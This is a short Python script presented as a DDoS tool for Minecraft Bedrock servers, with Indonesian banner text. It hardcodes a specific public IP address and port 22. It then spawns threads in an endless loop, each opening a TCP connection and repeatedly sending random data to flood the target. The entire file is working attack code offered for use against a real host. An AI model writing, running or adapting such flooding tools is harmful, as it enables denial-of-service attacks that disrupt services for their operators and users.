import random
import socket
import threading
import time
import os

ip = "139.162.17.33"
port = 22

class DdosAttack(threading.Thread):
	def run(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			data = random._urandom(int(random.randint(1024, 60000)))
			address = (str(ip), int(port))
			try:
				s.connect(address)
				while True:
					s.send(data)
					print("[*] Success Attack To "+ip)
					time.sleep(5)
			except:
				s.close()
		except:
			s.close()

if __name__ == '__main__':
	try:
		while True:
			ddos = DdosAttack()
			ddos.start()
	except(KeyboardInterrupt):
		os.system('cls' if os.name == 'nt' else 'clear')
		print("=====================================================================")
		print("DDOS Tools For Minecraft Bedrock Server")
		print("=====================================================================")
		print("\n\n")
		print("Attack Ke Server {} Dihentikan!".format(ip))